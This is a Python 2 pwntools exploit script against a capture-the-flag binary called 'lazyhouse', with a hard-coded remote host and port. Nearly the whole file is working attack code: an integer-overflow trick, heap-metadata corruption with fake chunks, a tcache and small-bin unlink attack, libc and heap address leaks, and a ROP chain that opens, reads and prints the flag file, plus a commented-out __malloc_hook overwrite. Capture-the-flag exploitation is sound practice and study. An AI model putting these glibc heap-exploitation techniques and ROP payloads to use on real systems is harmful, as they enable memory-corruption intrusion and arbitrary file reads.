#!/usr/bin/env python2

from pwn import *

BINARY = './lazyhouse'
HOST, PORT = '3.115.121.123', 5731

elf = ELF('./lazyhouse')
libc = ELF('./libc.so.6')

def start():
	if not args.REMOTE:
		print "LOCAL PROCESS"
		return process(BINARY)
	else:
		print "REMOTE PROCESS"
		return remote(HOST, PORT)

def get_base_address(proc):
	return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(p)
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    gdb.attach(p,gdbscript=script)

def buy(idx, size, content):
	p.sendlineafter(': ', '1')
	p.sendlineafter(':', str(idx))
	p.sendlineafter(':', str(size))
	p.sendafter(':', content)

def show(idx):
	p.sendlineafter(': ', '2')
	p.sendlineafter(':', str(idx))

def sell(idx):
	p.sendlineafter(': ', '3')
	p.sendlineafter(':', str(idx))

def upgrade(idx, content):
	p.sendlineafter(': ', '4')
	p.sendlineafter(':', str(idx))
	p.sendafter(':', content)

def super_house(content):
	p.sendlineafter(': ', '5')
	p.sendafter(':', content)

context.arch = 'amd64'
context.terminal = ['tmux', 'new-window']

p = start()

if args.GDB:
	debug([])

def get_money():
	payload = ((2**64-1)/218)+1

	p.sendlineafter(': ', '1')
	p.sendlineafter(':', '0')
	p.sendlineafter(':', str(payload))

	sell(0)

get_money()

buy(0, 0x80, 'A'*0x80) # Used to overwrite into chunk B
buy(1, 0x500, 'B'*0x500) # Chunk B
buy(2, 0x80, 'C'*0x80) # Prevent consolidation with top chunk

# Sell chunk B into unsorted bin
sell(1)
buy(1, 0x600, 'A'*0x600) # Move chunk B to large bin

# Overflow to turn on the IS_MMAPPED bit of chunk B
# This prevents calloc from clearing the chunk when we reallocate it
upgrade(0, '\x00'*0x88 + p64(0x513))

# Get chunk B back without it being zeroed out
buy(7, 0x500, 'A'*8)

# Leak libc and heap addresses
show(7)
data = p.recv(0x18)

libc.address = u64(data[8:16]) - 0x1e50d0
heap = u64(data[16:24]) - 0x2e0

pop_rdi = libc.address + 0x26542
pop_rsi = libc.address + 0x26f9e
pop_rdx = libc.address + 0x12bda6
pop_rax = libc.address + 0x47cf8
syscall = libc.address + 0xcf6c5
malloc_hook = libc.symbols['__malloc_hook']
leave_ret = libc.address + 0x58373

log.info('Libc base: ' + hex(libc.address))
log.info('Heap base: ' + hex(heap))

# Clear indexes 0, 1, and 2
sell(0) # goes into tcache 0x80
sell(1) # merges with top chunk
sell(2) # goes into tcache 0x80

# Create a fake 0x230 sized chunk within a new chunk
# The target address is used to pass the unlink_chunk checks in libc 2.29
target = heap + 0x890
buy(6, 0x80, '\x00'*8 + p64(0x231)+p64(target+8)+p64(target+0x10)+p64(target))

# Create enough chunks to create a 0x230 sized gap between the fake 0x230 chunk above
# and the 0x600 sized chunk below that we will consolidate backwards
buy(5, 0x80, 'C'*0x80)
buy(0, 0x80, 'D'*0x80)
buy(1, 0x80, 'E'*0x80)

# This chunk will be freed to consolidate backwards
buy(2, 0x600, '\x00'*0x600)

# Set prev size to go back to the fake 0x230 chunk
# Clear prev inuse bit of the 0x600 sized chunk
upgrade(1, '\x00'*0x80 + p64(0x230) + p64(0x610))

# 0x600 chunk will now be freed and consolidated back to the fake 0x230 sized chunk
# Top chunk is right after this, so top chunk is consolidated all the way back too
sell(2)

# Index 5 will be the 0x6c1 sized fake chunk in the payload
# Index 0 will be the 0x31 sized chunk
# Index 1 will be the 0x21 sized chunk
payload = '\x00'*0x78 + p64(0x6c1) # Index 5
payload += p64(0)*17 + p64(0x31) # Index 0
payload += p64(0)*17 + p64(0x21) # Index 1
payload += p64(0)*15
buy(2, 0x500, payload)

# We put pointers to these chunks into the tcache_perthread_struct now
# This is required later when we do the small bin unlink attack
sell(0) # Free 0x30 sized chunk
sell(1) # Free 0x20 sized chunk

# Consolidate backwards again
# Any new allocations following this will allow us to overwrite the metadata of any
# of the chunks from above
sell(2)

# We create a chunk to go right up to the 0x20 sized chunk's fd and bk
# We must also maintain the 0x6c1 sized fake chunk here as we still have a pointer to it
# We will free the fake 0x6c1 chunk into the unsorted bin later
# It will be used to overwrite the metadata of the fake chunks from above
buy(0, 0x1a0, p64(0)*15+p64(0x6c1))

# This chunk will be right after the 0x20 sized chunk's fd and bk from above
# It will be sent into the small bin
# We will use it to perform a small bin unlink attack later
buy(1, 0x210, 'A'*0x210)

# Just a filler chunk for the next chunk
buy(2, 0x210, 'B'*0x210)
sell(2) # Send to tcache

# We need the fake 0xd1 chunk header here to be able to free the 0x6c1 chunk
# This can be calculated using gdb
buy(2, 0x210, '\x00'*0x148+p64(0xd1))
sell(2) # Send to tcache

# Fill the 0x210 tcache bin
for i in range(5):
	buy(2, 0x210, 'a')
	sell(2)

# We create a fake 0x100 chunk header in the tcache_perthread_struct
# by freeing this chunk
buy(2, 0x3a0, 'A'*0x3a0)
sell(2) # Send to tcache

# Send that initial 0x210 sized chunk into the small bin now
sell(1) # Send it to the unsorted bin
buy(1, 0x220, 'A'*0x210) # Move it to the small bin 

sell(5) # Free the fake 0x6c1 sized chunk into unsorted bin

smallbin = libc.address + 0x1e4eb0
tcache_fake_chunk = heap+0x40 # Fake chunk in the tcache_perthread_struct

payload = '\x00'*0x98 + p64(0x31) # 0x30 sized chunk pointer points here
payload += p64(tcache_fake_chunk) # Overwrite the fd to heapbase+0x40
payload += '\x00'*0x80 + p64(0x221) # 0x30 sized chunk pointer points here
payload += p64(smallbin) + p64(tcache_fake_chunk) # Overwrite fd and bk, corrupt smallbin
buy(5, 0x6b0, payload)

# Put the flag's location string at a known place on the heap
# Using gdb, the flag's location string will be at heapbase+0xa68
payload = 'Z'*0x18
payload += '/home/vagrant/flag'.ljust(0x20, '\x00')

# ROP to open the flag file
# Flag file's file descriptor will be 3
payload += p64(pop_rdi) + p64(heap+0xa68)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rax) + p64(2)
payload += p64(syscall)

# ROP to read the flag file's contents right into heapbase
payload += p64(pop_rdi) + p64(3)
payload += p64(pop_rsi) + p64(heap)
payload += p64(pop_rdx) + p64(0x100)
payload += p64(pop_rax) + p64(0)
payload += p64(syscall)

# ROP to write the contents of heapbase right into stdout
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi) + p64(heap)
payload += p64(pop_rdx) + p64(0x100)
payload += p64(pop_rax) + p64(1)
payload += p64(syscall)

buy(3, 0x210, payload)

'''
# Overwrite the 0x210 sized chunk tcache bin with pointer to __malloc_hook
buy(2, 0x210, p64(0)*0x20 + p64(malloc_hook))

# Overwrite __malloc_hook with a leave; ret gadget
super_house(p64(leave_ret)) # __mpn_mul_n+83

# rbp Is set to the rsi before calling __malloc_hook is called in calloc
# Therefore we pass heap+0xa80 as an argument, as our ROP chain starts at
# heap+0xa88
buy(4, heap+0xa80, 'A')
'''
p.interactive()
